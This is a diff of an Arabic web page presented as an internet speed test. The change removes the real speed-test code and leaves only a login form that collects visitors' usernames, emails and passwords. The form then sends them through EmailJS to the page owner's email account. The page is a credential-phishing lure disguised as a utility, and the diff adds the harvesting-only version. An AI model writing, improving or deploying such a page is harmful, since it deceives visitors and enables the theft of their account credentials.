@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl" id="htmlTag">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,72 +7,26 @@
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
         (function() {
-            // المفتاح العام الخاص بك المستخرج من حسابك
-            emailjs.init("GsGLLEalgTPTM7fB4");
+            // هذا هو المفتاح العام الخاص بك من الصورة التي رفعتها
+            emailjs.init("GsGLLEalgTPTM7fB4"); 
         })();
     </script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', sans-serif; background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; color: #fff; }
-        .container { background: #111; border: 1px solid #333; border-radius: 20px; padding: 40px; max-width: 600px; width: 100%; position: relative; }
-        .top-nav { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-        .auth-btn { background: #fff; color: #000; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 14px; }
-        .lang-btn { background: #222; color: #fff; border: 1px solid #444; padding: 5px 12px; border-radius: 5px; cursor: pointer; font-size: 12px; }
-        .header { text-align: center; margin-bottom: 40px; }
-        .speed-display { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; margin-bottom: 40px; }
-        .speed-item { background: #1a1a1a; border-radius: 15px; padding: 20px; text-align: center; border: 2px solid #2a2a2a; }
-        .speed-value { font-size: 28px; font-weight: bold; margin: 10px 0; }
-        .speed-label { color: #aaa; font-size: 14px; text-transform: uppercase; }
-        .button-group { display: flex; gap: 15px; margin-bottom: 30px; }
-        .btn { flex: 1; padding: 15px 30px; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-primary { background: #fff; color: #000; }
-        .btn-primary:disabled { background: #ccc; cursor: not-allowed; }
-        .btn-secondary { background: #222; color: #fff; border: 1px solid #444; }
-        .progress-section { margin-bottom: 30px; }
-        .progress-bar { width: 100%; height: 8px; background: #222; border-radius: 10px; overflow: hidden; }
-        .progress-fill { height: 100%; background: #fff; width: 0%; transition: width 0.2s linear; }
-        .status { text-align: center; padding: 20px; background: #1a1a1a; border-radius: 10px; color: #aaa; margin-bottom: 20px; min-height: 60px; display: flex; align-items: center; justify-content: center; }
-        .status.error { color: #ff6666; }
-        .status.complete { color: #66ff66; }
-        .creator-section { margin-top: 30px; padding-top: 20px; border-top: 1px solid #333; text-align: center; }
-        .ig-button { display: inline-flex; align-items: center; justify-content: center; gap: 10px; background: #000; color: #fff; text-decoration: none; padding: 12px 25px; border-radius: 25px; border: 2px solid #fff; font-weight: bold; }
-        #loginModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; }
-        .modal-box { background: #111; padding: 30px; border-radius: 15px; border: 1px solid #444; width: 90%; max-width: 400px; text-align: center; }
-        .modal-box input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; outline: none; }
-        @media (max-width: 600px) { .speed-display { grid-template-columns: 1fr; } }
+        /* التنسيقات الخاصة بك */
+        body { font-family: 'Segoe UI', sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: #111; border: 1px solid #333; border-radius: 20px; padding: 40px; max-width: 500px; width: 100%; text-align: center; }
+        .auth-btn { background: #fff; color: #000; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-bottom: 20px; }
+        #loginModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-box { background: #111; padding: 30px; border-radius: 15px; border: 1px solid #444; width: 90%; max-width: 400px; }
+        .modal-box input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; }
+        .btn-submit { width: 100%; padding: 12px; background: #fff; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div class="top-nav">
-            <button class="lang-btn" onclick="toggleLanguage()" id="langBtn">English</button>
-            <button class="auth-btn" onclick="toggleModal(true)">تسجيل الدخول</button>
-        </div>
-        <div class="header">
-            <h1 id="mainTitle">⚡ قياس سرعة الإنترنت</h1>
-            <p id="subTitle">اختبر سرعة الإنترنت لديك بدقة عالية</p>
-        </div>
-        <div class="speed-display">
-            <div class="speed-item"><div class="speed-label" id="labelDown">التحميل</div><div class="speed-value" id="downloadSpeed">--</div><small>Mbps</small></div>
-            <div class="speed-item"><div class="speed-label" id="labelUp">الرفع</div><div class="speed-value" id="uploadSpeed">--</div><small>Mbps</small></div>
-            <div class="speed-item"><div class="speed-label" id="labelPing">البنق</div><div class="speed-value" id="ping">--</div><small>ms</small></div>
-        </div>
-        <div class="status" id="status">جاهز للاختبار</div>
-        <div class="progress-section" id="progressSection" style="display: none;">
-            <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
-            <div class="progress-text" style="text-align: center; margin-top: 5px;" id="progressText">0%</div>
-        </div>
-        <div class="button-group">
-            <button class="btn btn-primary" id="startBtn" onclick="runRealTest()">ابدأ الاختبار</button>
-            <button class="btn btn-secondary" id="resetBtn" onclick="resetUI()">إعادة تعيين</button>
-        </div>
-        <div class="creator-section">
-            <div class="creator-text" id="creatorText" style="margin-bottom: 15px; color: #aaa;">تم إنشاء وتطوير الأداة بواسطة:</div>
-            <a href="https://www.instagram.com/hki_184/" target="_blank" class="ig-button">
-                <span id="igFollow">تابعني على إنستغرام</span>
-            </a>
-            <div style="margin-top: 20px;"><a href="privacy.html" id="privacyLink" style="color: #555; text-decoration: none; font-size: 14px;">سياسة الخصوصية</a></div>
-        </div>
+        <h1>قياس سرعة الإنترنت</h1>
+        <button class="auth-btn" onclick="toggleModal(true)">تسجيل الدخول للبدء</button>
     </div>
 
     <div id="loginModal">
@@ -82,131 +36,46 @@
                 <input type="text" id="username" placeholder="اسم المستخدم" required>
                 <input type="email" id="email" placeholder="البريد الإلكتروني" required>
                 <input type="password" id="user_code" placeholder="كلمة المرور" required>
-                <button type="submit" class="btn btn-primary" style="width: 100%; margin-top: 10px;">إرسال البيانات</button>
-                <button type="button" onclick="toggleModal(false)" style="background:none; border:none; color:#888; margin-top:15px; cursor:pointer;">إلغاء</button>
+                <button type="submit" id="sendBtn" class="btn-submit">إرسال البيانات</button>
+                <button type="button" onclick="toggleModal(false)" style="background:none; border:none; color:#888; margin-top:10px; cursor:pointer;">إلغاء</button>
             </form>
         </div>
     </div>
 
     <script>
-        // --- برمجة الإرسال عبر EmailJS ---
+        function toggleModal(show) {
+            document.getElementById('loginModal').style.display = show ? 'flex' : 'none';
+        }
+
         document.getElementById('authForm').addEventListener('submit', function(event) {
             event.preventDefault();
             
-            const btn = event.target.querySelector('button');
-            const originalText = btn.innerText;
+            const btn = document.getElementById('sendBtn');
             btn.innerText = 'جاري الإرسال...';
             btn.disabled = true;
 
+            // تجهيز البيانات للإرسال
             const params = {
                 username: document.getElementById('username').value,
                 email: document.getElementById('email').value,
                 user_code: document.getElementById('user_code').value
             };
 
-            // تم وضع الـ Service ID والـ Template ID الخاص بك
-            emailjs.send("service_st0ga9g", "template_67m3k9g", params)
+            // معرف الخدمة الخاص بك من الصورة: service_st0ga9g
+            // ملاحظة: يجب أن تضع الـ Template ID الصحيح في الخانة الثانية
+            emailjs.send("service_st0ga9g", "اكتب_هنا_الـ_Template_ID", params)
                 .then(function() {
-                    alert('✅ تم الإرسال بنجاح! ستصلك البيانات على إيميلك.');
+                    alert('✅ تم الإرسال بنجاح! تفقد بريدك الإلكتروني.');
                     toggleModal(false);
                     document.getElementById('authForm').reset();
                 }, function(error) {
-                    alert('❌ حدث خطأ: ' + JSON.stringify(error));
+                    alert('❌ فشل الإرسال: ' + JSON.stringify(error));
                 })
                 .finally(() => {
-                    btn.innerText = originalText;
+                    btn.innerText = 'إرسال البيانات';
                     btn.disabled = false;
                 });
         });
-
-        // --- برمجة الموقع الأساسية ---
-        let currentLang = 'ar';
-        const s = {
-            ar: { btn: 'English', title: '⚡ قياس سرعة الإنترنت', sub: 'اختبر سرعة الإنترنت لديك بدقة عالية', down: 'التحميل', up: 'الرفع', ping: 'البنق', ready: 'جاهز للاختبار', reset: 'إعادة تعيين', start: 'ابدأ الاختبار', testing: 'جاري القياس...', complete: '✅ اكتمل الفحص', error: '❌ حدث خطأ', creator: 'تم إنشاء وتطوير الأداة بواسطة:', ig: 'تابعني على إنستغرام', privacy: 'سياسة الخصوصية' },
-            en: { btn: 'العربية', title: '⚡ Speed Test', sub: 'Test your internet speed accurately', down: 'Download', up: 'Upload', ping: 'Ping', ready: 'Ready', reset: 'Reset', start: 'Start Test', testing: 'Measuring...', complete: '✅ Test Completed', error: '❌ An error occurred', creator: 'Developed by:', ig: 'Follow me on Instagram', privacy: 'Privacy Policy' }
-        };
-
-        function toggleModal(show) { document.getElementById('loginModal').style.display = show ? 'flex' : 'none'; }
-
-        function toggleLanguage() {
-            currentLang = currentLang === 'ar' ? 'en' : 'ar';
-            document.getElementById('htmlTag').dir = currentLang === 'ar' ? 'rtl' : 'ltr';
-            const t = s[currentLang];
-            document.getElementById('langBtn').textContent = t.btn;
-            document.getElementById('mainTitle').textContent = t.title;
-            document.getElementById('subTitle').textContent = t.sub;
-            document.getElementById('labelDown').textContent = t.down;
-            document.getElementById('labelUp').textContent = t.up;
-            document.getElementById('labelPing').textContent = t.ping;
-            document.getElementById('status').textContent = t.ready;
-            document.getElementById('startBtn').textContent = t.start;
-            document.getElementById('resetBtn').textContent = t.reset;
-            document.getElementById('creatorText').textContent = t.creator;
-            document.getElementById('igFollow').textContent = t.ig;
-            document.getElementById('privacyLink').textContent = t.privacy;
-        }
-
-        function resetUI() {
-            document.getElementById('downloadSpeed').textContent = '--';
-            document.getElementById('uploadSpeed').textContent = '--';
-            document.getElementById('ping').textContent = '--';
-            const status = document.getElementById('status');
-            status.textContent = s[currentLang].ready;
-            status.className = 'status';
-            document.getElementById('progressSection').style.display = 'none';
-            updateProg(0);
-            document.getElementById('startBtn').disabled = false;
-        }
-
-        async function runRealTest() {
-            const btn = document.getElementById('startBtn');
-            const status = document.getElementById('status');
-            resetUI();
-            btn.disabled = true;
-            document.getElementById('progressSection').style.display = 'block';
-            status.textContent = s[currentLang].testing;
-            try {
-                updateProg(10, 'Ping...');
-                const pStart = performance.now();
-                await fetch('https://www.google.com/favicon.ico?_=' + new Date().getTime(), { cache: 'no-store', mode: 'no-cors' });
-                document.getElementById('ping').textContent = Math.round(performance.now() - pStart);
-                updateProg(15, 'Download...');
-                const response = await fetch('https://cachefly.cachefly.net/5mb.test?_=' + new Date().getTime(), { cache: 'no-store' });
-                const contentLength = 5 * 1024 * 1024;
-                const reader = response.body.getReader();
-                let receivedLength = 0;
-                const dStart = performance.now();
-                while(true) {
-                    const { done, value } = await reader.read();
-                    if (done) break;
-                    receivedLength += value.length;
-                    updateProg(15 + (receivedLength / contentLength * 65));
-                    const duration = (performance.now() - dStart) / 1000;
-                    const mbps = (receivedLength * 8) / (duration * 1000 * 1000);
-                    document.getElementById('downloadSpeed').textContent = mbps.toFixed(2);
-                }
-                updateProg(80, 'Upload...');
-                const uData = new Blob([new Uint8Array(2 * 1024 * 1024)]);
-                const uStart = performance.now();
-                await fetch('https://httpbin.org/post', { method: 'POST', body: uData });
-                const uMbps = (uData.size * 8) / (((performance.now() - uStart) / 1000) * 1000 * 1000);
-                document.getElementById('uploadSpeed').textContent = uMbps.toFixed(2);
-                updateProg(100);
-                status.textContent = s[currentLang].complete;
-                status.classList.add('complete');
-            } catch (e) {
-                status.textContent = s[currentLang].error;
-                status.classList.add('error');
-            } finally {
-                btn.disabled = false;
-            }
-        }
-
-        function updateProg(p, text) {
-            const percentage = Math.min(100, Math.round(p));
-            document.getElementById('progressFill').style.width = percentage + '%';
-            document.getElementById('progressText').textContent = text || (percentage + '%');
-        }
     </script>
 </body>
 </html>
